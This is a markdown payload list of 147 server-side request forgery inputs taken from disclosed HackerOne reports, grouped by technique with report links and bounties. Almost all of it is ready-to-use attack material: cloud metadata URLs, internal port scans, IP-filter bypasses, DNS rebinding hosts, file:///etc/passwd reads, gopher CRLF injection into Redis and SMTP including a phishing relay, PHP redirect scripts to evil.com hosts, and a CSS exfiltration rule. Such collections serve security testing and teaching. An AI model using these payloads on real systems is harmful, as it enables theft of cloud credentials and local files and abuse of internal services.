# Server-Side Request Forgery

147 payloads from disclosed reports.

## Server-Side Request Forgery (SSRF) via the image_host GET parameter

### `6ae93660`

```
localhost:6725
```

— [\[Kafka Connect\] \[JdbcSinkConnector\]\[HttpSinkConnector\] RCE by leveraging file upload via SQLite JDBC driver and SSRF to internal Jolokia](https://hackerone.com/reports/1547877) · Aiven Ltd · [jarij](https://hackerone.com/jarij) · $5,000.0

### `b338cc38`

```
10.0.0.0/8
```

— [TURN server allows TCP and UDP proxying to internal network, localhost and meta-data services](https://hackerone.com/reports/333419) · Slack · [sandrogauci](https://hackerone.com/sandrogauci) · $3,500.0

### `c1b5e758`

```
http://169.254.169.254/latest/meta-data
```

**Parameter:** `endpoint`
— [SSRF By adding a custom integration on target.com](https://hackerone.com/reports/1055823) · Helium · [th0roid](https://hackerone.com/th0roid) · $500.0

### `77f59581`

```
http://169.254.169.254/latest/meta-data/ami-id
```

**Parameter:** `endpoint`
— [SSRF By adding a custom integration on target.com](https://hackerone.com/reports/1055823) · Helium · [th0roid](https://hackerone.com/th0roid) · $500.0

### `ec5bcba5`

```
https://localhost
```

— [Server-Side Request Forgery on SAML Application - Import via URL](https://hackerone.com/reports/324005) · Ping Identity · [ziot](https://hackerone.com/ziot) · $450.0

### `0f8ff068`

```
http://169.254.169.254/latest/meta-data/a
```

— [Server-Side Request Forgery on SAML Application - Import via URL](https://hackerone.com/reports/324005) · Ping Identity · [ziot](https://hackerone.com/ziot) · $450.0

### `8b92f198`

```
169.254.169.254
```

— [SSRF via filter bypass due to lax checking on IPs](https://hackerone.com/reports/1702864) · Nextcloud · [obitorasu](https://hackerone.com/obitorasu) · $250.0

### `47499b3d`

```
https://127.0.0.1:1
```

— [SSRF (Portscan) via Register Function (Custom Server)](https://hackerone.com/reports/16571) · RelateIQ · [pum](https://hackerone.com/pum)

### `b2e30906`

```
http://localhost/,
```

— [Server Side Request Forgery in macro creation](https://hackerone.com/reports/50537) · Phabricator · [haquaman](https://hackerone.com/haquaman)

### `f328a6ab`

```
http://127.0.0.1
```

— [Server Side Request Forgery in macro creation](https://hackerone.com/reports/50537) · Phabricator · [haquaman](https://hackerone.com/haquaman)

### `29695ac4`

```
http://169.254.169.254/meta-data
```

— [SSRF on testing endpoint](https://hackerone.com/reports/128685) · target.com · [agarri_fr](https://hackerone.com/agarri_fr)

### `0547c2a3`

```
http://127.0.0.1:8080**
```

**Parameter:** `url`
— [Server side request forgery (SSRF) on nextcloud implementation.](https://hackerone.com/reports/145524) · Nextcloud · [paglababa](https://hackerone.com/paglababa)

### `8294efc8`

```
https://127.0.0.1:22
```

— [SSRF at target.com/developer/apps/releases/new](https://hackerone.com/reports/213358) · Nextcloud · [t-pwn](https://hackerone.com/t-pwn)

### `f79194d9`

```
https://127.0.0.1:80
```

— [SSRF at target.com/developer/apps/releases/new](https://hackerone.com/reports/213358) · Nextcloud · [t-pwn](https://hackerone.com/t-pwn)

### `e682ebb9`

```
https://127.0.0.1:21
```

— [SSRF at target.com/developer/apps/releases/new](https://hackerone.com/reports/213358) · Nextcloud · [t-pwn](https://hackerone.com/t-pwn)

### `0814a3b8`

```
http://169.254.169.254/latest/meta-data/
```

**Parameter:** `url`
— [SSRF via webhook](https://hackerone.com/reports/243277) · Mixmax · [cablej](https://hackerone.com/cablej)

### `aaa9f888`

```
http://127.0.0.1:9200/haha.txt
```

— [SSRF vulnerability in target.com webhook](https://hackerone.com/reports/301924) · GitLab · [wuqidashi](https://hackerone.com/wuqidashi)

### `95f377ee`

```
https://target.com/iur/?f=1&image_host=https://127.0.0.1:18091/
```

**Parameter:** `image_host`
— [SSRF in target.com via the image_host parameter](https://hackerone.com/reports/358119) · DuckDuckGo · [fpatrik](https://hackerone.com/fpatrik)

### `ab852dea`

```
http://127.0.0.1:9998/
```

**Parameter:** `image_host`
— [SSRF in target.com via the image_host parameter](https://hackerone.com/reports/358119) · DuckDuckGo · [fpatrik](https://hackerone.com/fpatrik)

### `538f64c1`

```
http://127.0.0.1:8092/
```

**Parameter:** `image_host`
— [SSRF in target.com via the image_host parameter](https://hackerone.com/reports/358119) · DuckDuckGo · [fpatrik](https://hackerone.com/fpatrik)

### `776ae7b5`

```
http://127.0.0.1:8091/
```

**Parameter:** `image_host`
— [SSRF in target.com via the image_host parameter](https://hackerone.com/reports/358119) · DuckDuckGo · [fpatrik](https://hackerone.com/fpatrik)

### `494ae149`

```
http://127.0.0.1:18091/
```

**Parameter:** `image_host`
— [SSRF in target.com via the image_host parameter](https://hackerone.com/reports/358119) · DuckDuckGo · [fpatrik](https://hackerone.com/fpatrik)

### `5bca9c73`

```
https://target.com/iur/?f=1&image_host=https://127.0.0.1:18091/ui/
```

**Parameter:** `image_host`
— [SSRF in target.com via the image_host parameter](https://hackerone.com/reports/358119) · DuckDuckGo · [fpatrik](https://hackerone.com/fpatrik)

### `05bec16b`

```
https://127.0.0.1:18091/
```

**Parameter:** `image_host`
— [SSRF in target.com via the image_host parameter](https://hackerone.com/reports/358119) · DuckDuckGo · [fpatrik](https://hackerone.com/fpatrik)

### `788ce1ff`

```
curl -L http://169.254.169.254/metadata/v1/
```

— [SSRF in CI after first run](https://hackerone.com/reports/369451) · GitLab · [plazmaz](https://hackerone.com/plazmaz)

### `65d4eaac`

```
http://169.254.169.254/metadata/v1.json
```

— [SSRF in CI after first run](https://hackerone.com/reports/369451) · GitLab · [plazmaz](https://hackerone.com/plazmaz)

### `20c02c86`

```
http://169.254.169.254/metadata/v1/
```

— [SSRF in CI after first run](https://hackerone.com/reports/369451) · GitLab · [plazmaz](https://hackerone.com/plazmaz)

### `74b77666`

```
https://target.com/?ip=localhost;
```

**Parameter:** `ip`
— [SSRF in rompager-check](https://hackerone.com/reports/374818) · Hanno's projects · [bb9866f3f743d6bf69b6836](https://hackerone.com/bb9866f3f743d6bf69b6836)

### `2927c504`

```
https://target.com/iu/?u=http://127.0.0.1:6868%2fstatus%2f?q=http://evil.com/
```

**Parameter:** `u`
— [SSRF on target.com/iu/](https://hackerone.com/reports/398641) · DuckDuckGo · [d0nut](https://hackerone.com/d0nut)

### `2a43afdb`

```
http://target.com
```

— [Bypass of SSRF Vulnerability](https://hackerone.com/reports/879803) · Node.js third-party modules · [njgadhiya](https://hackerone.com/njgadhiya)

### `7240a40e`

```
https://target.com/import.css
```

— [\[H1-2006 2020\] Bounty Pay CTF challenge](https://hackerone.com/reports/895798) · h1-ctf · [0xfd](https://hackerone.com/0xfd)

### `b08a0ac0`

```
localhost
```

**Parameter:** `jabber_server`
— [Server Side Request Forgery in 'Jabber settings' in Admin Control Panel](https://hackerone.com/reports/1018568) · phpBB · [they](https://hackerone.com/they)

### `f74a428e`

```
Got the salt as `mrgrinch463`, the hash is calculated by `md5(salt+ip)`.
So we can create payload for any ip, here is script I created {F1132732} to generate the payload
I created payload for ip `127.0.0.1` ( I have to take down the grinch) and sent it in `payload` parameter.
```

**Parameter:** `payload`
— [Successfully took down the Grinch and saved the holidays from being ruined](https://hackerone.com/reports/1067530) · h1-ctf · [shubhamz007](https://hackerone.com/shubhamz007)

### `9fb6d2d7`

```
http://127.0.0.1:9090/api/v1/targets.
```

— [FogBugz import attachment full SSRF requiring vulnerability in *.target.com](https://hackerone.com/reports/1092230) · GitLab · [ajxchapman](https://hackerone.com/ajxchapman)

### `af033d38`

```
GET █████████masterUrl=http://target.com HTTP/1.1
Host: www.███
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
Accept-Language: en
Connection: close
Accept-Encoding: gzip
```

**Parameter:** `masterUrl`
— [ SSRF due to  CVE-2021-27905 in www.████████](https://hackerone.com/reports/1183472) · U.S. Dept Of Defense · [fdeleite](https://hackerone.com/fdeleite)

### `ad47d9f9`

```
http://target.com:22
```

**Parameter:** `url`
— [blind Server-Side Request Forgery (SSRF)  allows scanning internal ports](https://hackerone.com/reports/1300585) · Elastic · [lu3ky-13](https://hackerone.com/lu3ky-13)

### `b301f07e`

```
{"data":{"url":"https://127.0.0.1:80"}}
```

**Parameter:** `url`
— [Blind SSRF on https://target.com/ allows for internal network enumeration](https://hackerone.com/reports/1832494) · EXNESS · [null_hypothesis](https://hackerone.com/null_hypothesis)

### `9155341b`

```
POST /api/v2/chats/image-check HTTP/1.1
Host: target.com
… …
Content-Type: application/json
Content-Length: 41

{"url":"http://127.0.0.1:/?a=a.png"}
```

**Parameter:** `url`
— [target.com: Blind SSRF via /api/v2/chats/image-check allows for Internal Ports scan](https://hackerone.com/reports/1875484) · 8x8 · [yassinek3ch](https://hackerone.com/yassinek3ch)

### `3e336886`

```
http://192.168.100.9:8080.
```

— [SSRF via Improper Redirect Validation in Rocket.Chat oEmbed Function](https://hackerone.com/reports/3383079) · Rocket.Chat · [button142857](https://hackerone.com/button142857)

### `a0a3f003`

```
http://192.168.100.9:8080
```

— [SSRF via Improper Redirect Validation in Rocket.Chat oEmbed Function](https://hackerone.com/reports/3383079) · Rocket.Chat · [button142857](https://hackerone.com/button142857)

### `a0192436`

```
http://192.168.100.9:8080,
```

— [SSRF via Improper Redirect Validation in Rocket.Chat oEmbed Function](https://hackerone.com/reports/3383079) · Rocket.Chat · [button142857](https://hackerone.com/button142857)

### `7f37be92`

```
http://192.168.100.14
```

— [SSRF via improper validation after DNS name resolution in the link-preview feature](https://hackerone.com/reports/3393664) · Rocket.Chat · [button142857](https://hackerone.com/button142857)


## SSRF via CSS background-image URL injection

### `8f5227c9`

```
https://target.com/body
```

— [\[H1-2006 2020\] Bounty Pay CTF challenge](https://hackerone.com/reports/895798) · h1-ctf · [0xfd](https://hackerone.com/0xfd)

### `e07c4c85`

```
https://target.com/input
```

— [\[H1-2006 2020\] Bounty Pay CTF challenge](https://hackerone.com/reports/895798) · h1-ctf · [0xfd](https://hackerone.com/0xfd)

### `c859c483`

```
https://target.com/inputa
```

— [\[H1-2006 2020\] Bounty Pay CTF challenge](https://hackerone.com/reports/895798) · h1-ctf · [0xfd](https://hackerone.com/0xfd)

### `d23bc996`

```
https://target.com/inputb
```

— [\[H1-2006 2020\] Bounty Pay CTF challenge](https://hackerone.com/reports/895798) · h1-ctf · [0xfd](https://hackerone.com/0xfd)

### `fba96ceb`

```
https://target.com/input8
```

— [\[H1-2006 2020\] Bounty Pay CTF challenge](https://hackerone.com/reports/895798) · h1-ctf · [0xfd](https://hackerone.com/0xfd)

### `4ebe66be`

```
https://target.com/input9
```

— [\[H1-2006 2020\] Bounty Pay CTF challenge](https://hackerone.com/reports/895798) · h1-ctf · [0xfd](https://hackerone.com/0xfd)


## CSS background-image URL SSRF

### `f5d45b8b`

```
$i {
    background-image: url(https://target.com/$i);
}
```

— [\[H1-2006 2020\]  The Story of Making Bounty Hunters Happy](https://hackerone.com/reports/889333) · h1-ctf · [w31rd0](https://hackerone.com/w31rd0)

### `29c809c4`

```
https://target.com/div
```

— [\[H1-2006 2020\] Bounty Pay CTF challenge](https://hackerone.com/reports/895798) · h1-ctf · [0xfd](https://hackerone.com/0xfd)

### `9472256c`

```
https://target.com/button
```

— [\[H1-2006 2020\] Bounty Pay CTF challenge](https://hackerone.com/reports/895798) · h1-ctf · [0xfd](https://hackerone.com/0xfd)


## Gopher protocol SSRF with CRLF injection to execute arbitrary commands

### `5acd21d1`

```
gopher://example.com/1/selector%0d%0aINJECTED_COMMAND
```

— [Gopher Protocol Command Injection (SSRF Smuggling)](https://hackerone.com/reports/3508785) · curl · [andrew-bbp](https://hackerone.com/andrew-bbp)

### `9a5c1a0b`

```
curl -v "gopher://localhost:7070/1/first-command%0d%0asecond-command"
```

— [Gopher Protocol Command Injection (SSRF Smuggling)](https://hackerone.com/reports/3508785) · curl · [andrew-bbp](https://hackerone.com/andrew-bbp)

### `14605e05`

```
curl "gopher://localhost:7070/1/legitimate%0d%0ainjected%0d%0amalicious"
```

— [Gopher Protocol Command Injection (SSRF Smuggling)](https://hackerone.com/reports/3508785) · curl · [andrew-bbp](https://hackerone.com/andrew-bbp)


## SSRF targeting AWS metadata service via URL

### `ff405420`

```
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/user-data
```

— [SSRF vulnerability (access to metadata server on EC2 and OpenStack)](https://hackerone.com/reports/53088) · Phabricator · [agarri_fr](https://hackerone.com/agarri_fr) · $300.0

### `ee6e5e04`

```
http://169.254.169.254/latest/meta-data/hostname
```

— [SSRF vulnerability (access to metadata server on EC2 and OpenStack)](https://hackerone.com/reports/53088) · Phabricator · [agarri_fr](https://hackerone.com/agarri_fr) · $300.0

### `abfe4c50`

```
http://169.254.169.254/latest/user-data
```

— [SSRF vulnerability (access to metadata server on EC2 and OpenStack)](https://hackerone.com/reports/53088) · Phabricator · [agarri_fr](https://hackerone.com/agarri_fr) · $300.0


## Server‑side template injection using {{template:...}} to read arbitrary file

### `f13a4e0d`

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
...

preview_markup=Hello+{{name}}{{template:38dhs_admins_only_header.html}}+....&preview_data={"name":"Alice","email":"alice@test.com"}
```

**Parameter:** `preview_markup`
— [A Visit from The Grinch ~ 'Twas the night before Hackmas...](https://hackerone.com/reports/1067912) · h1-ctf · [bendtheory](https://hackerone.com/bendtheory)

### `e0562491`

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
...

preview_markup=Hello+{{name}}+....&preview_data={"name":"Alice{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}
```

**Parameter:** `preview_data`
— [A Visit from The Grinch ~ 'Twas the night before Hackmas...](https://hackerone.com/reports/1067912) · h1-ctf · [bendtheory](https://hackerone.com/bendtheory)


## SSRF via dynamically generated CSS background-image URLs

### `3b61ee6a`

```
https://target.com/input{}{}
```

— [\[H1-2006 2020\] Bounty Pay CTF challenge](https://hackerone.com/reports/895798) · h1-ctf · [0xfd](https://hackerone.com/0xfd)

### `186d83a6`

```
https://target.com/inputcode{}_{}
```

— [\[H1-2006 2020\] Bounty Pay CTF challenge](https://hackerone.com/reports/895798) · h1-ctf · [0xfd](https://hackerone.com/0xfd)


## SSRF via host/port injection in JSON body (email configuration endpoint)

### `f2887e98`

```
{"imapHost":"127.0.0.1","imapPort":<port_number>,"imapSslMode":"none","imapUser":"xxx@xxx.org","imapPassword":"xxx","smtpSslMode":"none","smtpUser":"xxx@xxx.org","smtpPassword":"xxx","accountName":"xxx@xxx.org","emailAddress":"xxx@xxx.org"}
```

— [Mail app - blind SSRF via imapHost parameter](https://hackerone.com/reports/1736390) · Nextcloud · [supr4s](https://hackerone.com/supr4s)

### `70a00a7c`

```
{"imapHost":"target.com","imapPort":993,"imapSslMode":"ssl","imapUser":"redacted","imapPassword":"redacter","smtpHost":"127.0.0.1","smtpPort":8080,"smtpSslMode":"none","smtpUser":"xx","smtpPassword":"xx","accountName":"Test1","emailAddress":"xxx@xxx.org"}
```

— [Mail app - blind SSRF via smtpHost parameter](https://hackerone.com/reports/1746582) · Nextcloud · [supr4s](https://hackerone.com/supr4s)


## SSRF using NAT64 IPv6 address to bypass private‑IP filter

### `cd5bc38a`

```
TIPSEN:~:% curl -sS 'http://localhost:4568/fetch?url=http://[64:ff9b::7f00:1]:18081'
{"status":"blocked","error":"SsrfFilter::PrivateIPAddress","message":"Hostname '64:ff9b::7f00:1' has no public ip addresses"}%
```

**Parameter:** `url`
— [SSRF Filter Bypass via Unblocked NAT64 Local-Use IPv6 Prefix (64:ff9b:1::/48)](https://hackerone.com/reports/3634400) · arkadiyt-projects · [tipsen](https://hackerone.com/tipsen)

### `d349c40a`

```
TIPSEN:~:% curl -sS 'http://localhost:4568/fetch?url=http://[64:ff9b:1::7f00:1]:18081'
{"status":"allowed","code":"200","headers":{"content-type":"text/plain","content-length":"24","connection":"close"},"body":"NAT64_PREFIX_BYPASS_DEMO"}%
```

**Parameter:** `url`
— [SSRF Filter Bypass via Unblocked NAT64 Local-Use IPv6 Prefix (64:ff9b:1::/48)](https://hackerone.com/reports/3634400) · arkadiyt-projects · [tipsen](https://hackerone.com/tipsen)


## SSRF payload with embedded credentials targeting internal IP

### `5a6a57d3`

```
https://1:@127.0.0.1:\@@@@w.evil.com/@https://target.com/
```

**Parameter:** `url`
— [SSRF In Get Video Contents](https://hackerone.com/reports/643622) · Semrush · [egoist233](https://hackerone.com/egoist233)

### `c25827c3`

```
https://1:@10.0.0.1:\@@@@w.evil.com/@https://target.com/
```

**Parameter:** `url`
— [SSRF In Get Video Contents](https://hackerone.com/reports/643622) · Semrush · [egoist233](https://hackerone.com/egoist233)


## SSRF port scan of localhost FTP port (21) using the 'url' parameter

### `7fb61425`

```
http://127.0.0.1:21/?%0A
```

**Parameter:** `url`
— [SSRF in target.com via ?url= parameter](https://hackerone.com/reports/514224) · GSA Bounty · [niwasaki](https://hackerone.com/niwasaki) · $150.0

### `fd1f4dff`

```
http://127.0.0.1:22/?%0A
```

**Parameter:** `url`
— [SSRF in target.com via ?url= parameter](https://hackerone.com/reports/514224) · GSA Bounty · [niwasaki](https://hackerone.com/niwasaki) · $150.0


## CSS attribute selector with background-image URL SSRF

### `9af0334e`

```
input[name^=$i] ~ *{
    background-image: url(https://target.com/exfil/$i);
}
```

— [\[H1-2006 2020\]  The Story of Making Bounty Hunters Happy](https://hackerone.com/reports/889333) · h1-ctf · [w31rd0](https://hackerone.com/w31rd0)


## DNS rebinding attack with crafted hostname "A.1.1.1.1.1time.127.0.0.1.forever.rebind.network"

### `cd813c82`

```
A.1.1.1.1.1time.127.0.0.1.forever.rebind.network
```

— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)


## DNS rebinding payload to reach localhost

### `401fcf4e`

```
make-1.1.1.1-rebindfor15s-127.0.0.1-rr.1u.ms
```

**Parameter:** `target`
— [hackyholidays CTF Writeup](https://hackerone.com/reports/1069080) · h1-ctf · [un5h4d0w](https://hackerone.com/un5h4d0w)


## DNS‑rebinding SSRF using a crafted domain inside a JSON payload

### `3d848634`

```
Got resposne,
{F1132737}
There is some protection for hitiing localhost so we have to bypass that protection.
Any address we give it first resolves it into an IP address then performs attack. 
There is a cool attack called [DNS-rebinding][33]
[33]: https://target.com/wiki/DNS_rebinding   "DNS-rebinding"
Here I used [https://evil.com/taviso/rbndr][34] to perform DNS-rebinding, using `evil2.com` to create payload
[34]: https://evil.com/taviso/rbndr    "https://evil.com
```

**Parameter:** `payload`
— [Successfully took down the Grinch and saved the holidays from being ruined](https://hackerone.com/reports/1067530) · h1-ctf · [shubhamz007](https://hackerone.com/shubhamz007)


## File read via SSRF using ffmpeg concat protocol in a crafted playlist to include file:///etc/passwd

### `facc92ae`

```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://target.com/header.m3u8|file:///etc/passwd
#EXT-X-ENDLIST
```

— [SSRF and local file read in video to gif converter](https://hackerone.com/reports/115857) · Imgur · [sl1m](https://hackerone.com/sl1m)


## file:// scheme SSRF to read a local file

### `20a7d669`

```
file:///home/user/#.js
```

— [Full read SSRF in target.com that can leak aws metadata and local file inclusion](https://hackerone.com/reports/1189367) · Evernote · [neolex](https://hackerone.com/neolex)


## Gopher SSRF to issue Redis commands via CRLF injection

### `ad2e0f25`

```
gopher://internal-redis:6379/1/SET%20key%20value%0d%0aGET%20sensitive_data
```

— [Gopher Protocol Command Injection (SSRF Smuggling)](https://hackerone.com/reports/3508785) · curl · [andrew-bbp](https://hackerone.com/andrew-bbp)


## Gopher SSRF to perform SMTP relay via CRLF injection

### `4d7198d7`

```
gopher://mail-server:25/1/MAIL%20FROM:<attacker@evil.com>%0d%0aRCPT%20TO:<victim@target.com>%0d%0aDATA%0d%0aSubject:%20Phishing
```

— [Gopher Protocol Command Injection (SSRF Smuggling)](https://hackerone.com/reports/3508785) · curl · [andrew-bbp](https://hackerone.com/andrew-bbp)


## Host header injection for SSRF with external host

### `e4f891c4`

```
GET / HTTP/1.1
Host: ████████.burpcollaborator.net
Pragma: no-cache
Cache-Control: no-cache, no-transform
Cookie: mt=rid=6130; ASPSESSIONIDQABQSQCS=GNPLOPOCDIGPIKHGFMDDBLBG
X--------------: 1.1.1.1      
Accept-Encoding: gzip, deflate, identity
Connection: Keep-Alive
Authorization: Basic ████████
X-BlueCoat-Via: 913daace1d652c00
```

— [SSRF vulnerability on ██████████ leaks internal IP and various sensitive information](https://hackerone.com/reports/310036) · U.S. Dept Of Defense · [alyssa_herrera](https://hackerone.com/alyssa_herrera)


## Host header injection using @ to trigger SSRF

### `fbd7bd13`

```
GET / HTTP/1.1
Host: www.█████████:80@██████████.burpcollaborator.net
Pragma: no-cache
Cache-Control: no-cache, no-transform
Connection: close
```

— [SSRF vulnerability on ██████████ leaks internal IP and various sensitive information](https://hackerone.com/reports/310036) · U.S. Dept Of Defense · [alyssa_herrera](https://hackerone.com/alyssa_herrera)


## SSRF address injection (127.0.0.1) for internal service access

### `eeabc759`

```
127.0.0.1
```

— [Evaluating Ruby code by injecting Rescue job on the system_hook_push queue through web hook](https://hackerone.com/reports/299473) · GitLab · [jobert](https://hackerone.com/jobert) · $750.0


## SSRF bypass using the target.com domain (DNS rebinding to localhost)

### `da3ce4a1`

```
target.com
```

— [Complete destruction of the Grinch server](https://hackerone.com/reports/1065885) · h1-ctf · [shamollash](https://hackerone.com/shamollash)


## SSRF to cloud metadata service (169.254.169.254)

### `f3fa6e40`

```
http://169.254.169.254/
```

— [Blind POST SSRF via Web Push Notification Endpoint](https://hackerone.com/reports/3608558) · phpBB · [misop00p](https://hackerone.com/misop00p)


## SSRF via crafted HTTP request with Host and X-AnonResource headers

### `afc7f944`

```
curl -i -s -k -X $'GET' \
    -H $'Host: █████' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11.1; rv:86.0) Gecko/20100101 Firefox/86.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/l
```

— [CVE-2021-26855 on ████████ resulting in SSRF](https://hackerone.com/reports/1119228) · U.S. Dept Of Defense · [spongebhav](https://hackerone.com/spongebhav)


## SSRF via crafted URL parameter with authentication credentials to force internal request

### `88dc51c7`

```
GET /blog/services/oembed/?url=https://1:@127.0.0.1:\@@@@w.evil2.com/@https://target.com/&callback=CKEDITOR._.jsonpCallbacks[89] HTTP/1.1
Host: evil.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Referer: https://evil.com//my-posts/████/edit/
Connection: close
███
X-Forwarded-For: 127.0.0.1
```

**Parameter:** `url`
— [SSRF In Get Video Contents](https://hackerone.com/reports/643622) · Semrush · [egoist233](https://hackerone.com/egoist233)


## SSRF / data exfiltration using a malicious URL with query parameters

### `8f70850c`

```
https://target.com/record-data?name=path&data=
```

— [\[h1-415 2020\] SSRF in a headless chrome with remote debugging leads to sensible information leak](https://hackerone.com/reports/781295) · h1-ctf · [d1r3wolf](https://hackerone.com/d1r3wolf)


## SSRF using decimal representation of 127.0.0.1 (2130706433)

### `fd67cae0`

```
2130706433
```

— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)


## SSRF via direct URL to an internal resource

### `c45de0fb`

```
http://127.0.0.1/test.png
```

— [Blind SSRF via image upload URL downloader on https://██████/ ](https://hackerone.com/reports/1691501) · U.S. Dept Of Defense · [696e746c6f6c](https://hackerone.com/696e746c6f6c)


## SSRF via embedding a full URL in the path (http://127.0.0.1)

### `61ca117d`

```
http://target.com/http://127.0.0.1
```

**Parameter:** `pathname`
— [\[CVE-2022-35949\]: undici.request vulnerable to SSRF using absolute / protocol-relative URL on pathname ](https://hackerone.com/reports/1663788) · Internet Bug Bounty · [haxatron1](https://hackerone.com/haxatron1)


## SSRF exploiting image_host parameter to access internal metadata service

### `9524055d`

```
https://target.com/iur/?f=1&image_host=http://169.254.169.254/latest/meta-data/
```

**Parameter:** `image_host`
— [SSRF vulnerability on target.com (access to metadata server on AWS)](https://hackerone.com/reports/395521) · DuckDuckGo · [cujanovic](https://hackerone.com/cujanovic)


## SSRF file protocol bypass using character class obfuscation (e.g., f[h-j]le:///etc/passwd)

### `06a4d041`

```
curl -vv 'f[h-j]le:///etc/passwd' will  parse 3 request , like  curl -vv 'fhle:///etc/passwd' 、curl -vv 'file:///etc/passwd' 、curl -vv 'fjle:///etc/passwd'
```

— [error parse uri path in curl](https://hackerone.com/reports/1566462) · curl · [iylz](https://hackerone.com/iylz)


## SSRF using the file:// scheme to access the filesystem

### `1605f932`

```
file:///
```

— [SSRF chained to hit internal host leading to another SSRF which allows to read internal images.](https://hackerone.com/reports/826097) · PlayStation · [bugdiscloseguys](https://hackerone.com/bugdiscloseguys) · $1,000.0


## SSRF using the file:// scheme to read local files

### `b7d908fd`

```
file://
```

— [SSRF chained to hit internal host leading to another SSRF which allows to read internal images.](https://hackerone.com/reports/826097) · PlayStation · [bugdiscloseguys](https://hackerone.com/bugdiscloseguys) · $1,000.0


## SSRF forcing the server to issue a GET request to attacker‑controlled path

### `d1b3969f`

```
root@2efebadd421d:/app# perl -MIO::Socket::INET -ne 'BEGIN{$l=IO::Socket::INET->new( LocalPort=>80,Proto=>"tcp",Listen=>5,ReuseAddr=>1); my $l=$l->accept(); while(<$l>){ print $_; }; close($l);}'
GET /PATH_IS_KEPT HTTP/1.1
Host: redacted
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299
Accept-Language: en-US, en; q=0.8
Cache-Control: no-cache
Pragma: no-cache
Accept: text/html, application/xhtml+xml, app
```

— [Blind HTTP GET SSRF via website icon fetch (bypass of pull#812)](https://hackerone.com/reports/925527) · Bitwarden · [shielder](https://hackerone.com/shielder)


## SSRF via FTP PASV command injection using a malicious script passed to the -x option

### `3208f5b2`

```
./ssrf_pasvaggresvftp.sh -t 127.0.0.1/31 -p 80,8000-8100 -x ./ftp_curl.sh -vv
```

— [CVE-2020-8284: trusting FTP PASV responses](https://hackerone.com/reports/1040166) · curl · [vepe](https://hackerone.com/vepe)


## SSRF via gopher redirect to an SMTP server to issue arbitrary SMTP commands

### `005b2657`

```
<?php
        $commands = array(
                'HELO target.com',
                'MAIL FROM: <imgur@imgur.com>',
                'RCPT TO: <bit-bucket@test.evil.com>',
                'DATA',
                'Test mail',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://evil2.com:25/_'.$payload);
?>
```

— [SSRF in https://target.com/vidgif/url](https://hackerone.com/reports/115748) · Imgur · [aesteral](https://hackerone.com/aesteral)


## SSRF via hostname override using protocol‑relative path (//127.0.0.1)

### `faa6d816`

```
http://target.com//127.0.0.1
```

**Parameter:** `pathname`
— [\[CVE-2022-35949\]: undici.request vulnerable to SSRF using absolute / protocol-relative URL on pathname ](https://hackerone.com/reports/1663788) · Internet Bug Bounty · [haxatron1](https://hackerone.com/haxatron1)


## SSRF via HTTP 302 redirect to a gopher:// URL delivering a raw gopher payload

### `62b8cbb8`

```
<?php
        header('Location: gopher://evil.com:12346/_HI%0AMultiline%0Atest');
?>
```

— [SSRF in https://target.com/vidgif/url](https://hackerone.com/reports/115748) · Imgur · [aesteral](https://hackerone.com/aesteral)


## SSRF via HTTPS URL to an internal address

### `c4445d64`

```
https://127.0.0.1/
```

— [Blind SSRF via image upload URL downloader on https://██████/ ](https://hackerone.com/reports/1691501) · U.S. Dept Of Defense · [696e746c6f6c](https://hackerone.com/696e746c6f6c)


## SSRF via HTTPS URL to localhost

### `91d29cb6`

```
https://localhost/
```

— [Blind SSRF via image upload URL downloader on https://██████/ ](https://hackerone.com/reports/1691501) · U.S. Dept Of Defense · [696e746c6f6c](https://hackerone.com/696e746c6f6c)


## SSRF using iframe src to internal localhost service

### `e9730358`

```
<iframe src='http://localhost:9222 width=900 height=900></iframe>
```

**Parameter:** `content`
— [\[h1-415 2020\] h1ctf{y3s_1m_c0sm1c_n0w}](https://hackerone.com/reports/781253) · h1-ctf · [pirateducky](https://hackerone.com/pirateducky)


## SSRF via iframe src pointing to internal service (Chrome DevTools)

### `d5464337`

```
<iframe src='http://localhost:9222/json width=900 height=900></iframe>
```

— [\[h1-415 2020\] h1ctf{y3s_1m_c0sm1c_n0w}](https://hackerone.com/reports/781253) · h1-ctf · [pirateducky](https://hackerone.com/pirateducky)


## SSRF to internal host using webhook URL pointing to 127.0.0.1

### `d040fb06`

```
http://127.0.0.1:80/haha.txt
```

**Parameter:** `url`
— [SSRF vulnerability in target.com webhook](https://hackerone.com/reports/301924) · GitLab · [wuqidashi](https://hackerone.com/wuqidashi)


## SSRF to internal localhost service

### `679d8d8c`

```
http://localhost
```

**Parameter:** `url`
— [SSRF via webhook](https://hackerone.com/reports/243277) · Mixmax · [cablej](https://hackerone.com/cablej)


## SSRF to internal Prometheus endpoint via URL

### `f958660f`

```
http://localhost:9090/api/v1/targets
```

